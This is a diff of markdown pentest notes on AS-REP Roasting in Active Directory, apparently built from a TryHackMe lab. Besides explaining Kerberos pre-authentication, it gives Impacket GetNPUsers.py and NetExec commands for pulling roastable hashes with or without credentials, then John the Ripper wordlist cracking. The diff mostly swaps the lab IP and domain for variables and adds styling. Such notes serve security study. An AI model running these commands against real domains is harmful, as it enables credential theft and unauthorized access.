@@ -1,12 +1,17 @@
 #AD_AS-REP_Roasting
 
 
+> [!info] What is AS-REP Roasting?
 > AS-REP Roasting is an Active Directory attack where you request encrypted password hashes for accounts that don’t require Kerberos pre-authentication, and then crack the hashes offline.
 
 
-# Explanation
+# <span style="color:#FF5555">Explanation</span>
 
-### **Normal Kerberos Authentication Flow**
+> [!info] Variables used below
+> - `$DC_IP` – Domain Controller's IP
+> - `$DOMAIN` – target domain name
+
+### <span style="color:#50FA7B">Normal Kerberos Authentication Flow</span>
 
 - **AS-REQ (Authentication Service Request):** The client requests a Ticket Granting Ticket (TGT) from the Key Distribution Center / Domain Controller (KDC/DC).
     
@@ -17,7 +22,7 @@
 - **Next Flow:** The user proceeds to the Ticket Granting Service (TGS) exchange to request service tickets.
     
 
-### **When `DONT_REQ_PREAUTH` is Enabled**
+### <span style="color:#50FA7B">When `DONT_REQ_PREAUTH` is Enabled</span>
 
 When an account has the **`DONT_REQ_PREAUTH`** flag enabled (a.k.a. _"Do not require Kerberos preauthentication"_), the user is **not required** to prove their identity during the initial request.
 
@@ -28,26 +33,27 @@ When an account has the **`DONT_REQ_PREAUTH`** flag enabled (a.k.a. _"Do not req
 3. **AS-REP:** The KDC immediately returns an `AS-REP` containing an encrypted TGT **without verifying the requester's identity**.
     
 
+> [!info] Key Point
 > While no plaintext password is sent directly, the returned `AS-REP` contains encrypted ticket data. An attacker can take this response offline and attempt to **crack the user's password using brute-force tools** (AS-REP Roasting).
 
 
 
 
 ___
-# Step-by-Step Attack:-
+# <span style="color:#FF5555">Step-by-Step Attack:-</span>
 
 
-# Scenario 1 — Unauthenticated (username list)
+# <span style="color:#FF5555">Scenario 1 — Unauthenticated (username list)</span>
 
 You don't have creds, but you enumerated valid usernames (RID cycling, OSINT, null session, etc.).
 ```bash
 # Impacket — spray a userlist, request AS-REPs, save hashcat-format hashes
 # GetNPUsers -> Users with `No Pre-Authentication` required
-GetNPUsers.py 'THM.CORP/' -usersfile users.txt -no-pass -dc-ip 10.10.250.148 -format hashcat -outputfile as-rep.txt
+GetNPUsers.py '$DOMAIN/' -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt
 
 # NetExec — needs anonymous LDAP bind to be allowed (rare on modern DCs),
 # otherwise use Scenario 2 with creds
-nxc ldap 10.10.250.148 -u users.txt -p '' --asreproast as-rep.txt
+nxc ldap $DC_IP -u users.txt -p '' --asreproast as-rep.txt
 ```
 
 - `-u users.txt`: A list of usernames to test.
@@ -59,20 +65,20 @@ nxc ldap 10.10.250.148 -u users.txt -p '' --asreproast as-rep.txt
 ___
 
 
-## Scenario 2 — Authenticated (query LDAP for the flag)
+## <span style="color:#8BE9FD">Scenario 2 — Authenticated (query LDAP for the flag)</span>
 
 You have any valid domain credential. This lets you ask LDAP _which_ accounts are roastable instead of guessing, then request only those. Preferred when possible.
 
-## Without BloodHound
+## <span style="color:#8BE9FD">Without BloodHound</span>
 ```bash
 # Impacket — -request auto-finds DONT_REQ_PREAUTH accounts and roasts them
-GetNPUsers.py 'THM.CORP/user:Password123' -request -dc-ip 10.10.250.148 -format hashcat -outputfile as-rep.txt
+GetNPUsers.py '$DOMAIN/user:Password123' -request -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt
 
 # NetExec
-nxc ldap 10.10.250.148 -u user -p 'Password123' --asreproast as-rep.txt
+nxc ldap $DC_IP -u user -p 'Password123' --asreproast as-rep.txt
 ```
 
-## With BloodHound
+## <span style="color:#8BE9FD">With BloodHound</span>
 
 OR  when you uploaded the files to bloodhound GUI
 
@@ -87,18 +93,18 @@ suppose in this case we have three users
 - LEANN_LONG@THM.CORP
 
 
-## Requesting hashes for specific users
+## <span style="color:#8BE9FD">Requesting hashes for specific users</span>
 
 Using impacket’s `GetNPUsers.py` to request a tgt for the users.
 
 ```bash
-$ GetNPUsers.py -request -format john -no-pass thm.corp/ERNESTO_SILVA
-$ GetNPUsers.py -request -format john -no-pass thm.corp/TABATHA_BRITT
-$ GetNPUsers.py -request -format john -no-pass thm.corp/LEANN_LONG
+$ GetNPUsers.py -request -format john -no-pass $DOMAIN/ERNESTO_SILVA
+$ GetNPUsers.py -request -format john -no-pass $DOMAIN/TABATHA_BRITT
+$ GetNPUsers.py -request -format john -no-pass $DOMAIN/LEANN_LONG
 ```
 
 
-# **Crack the Ticket**
+# <span style="color:#FF5555">Crack the Ticket</span>
 
 ```bash
 john --wordlist=/home/kali/Documents/password.txt ./as-rep.txt 
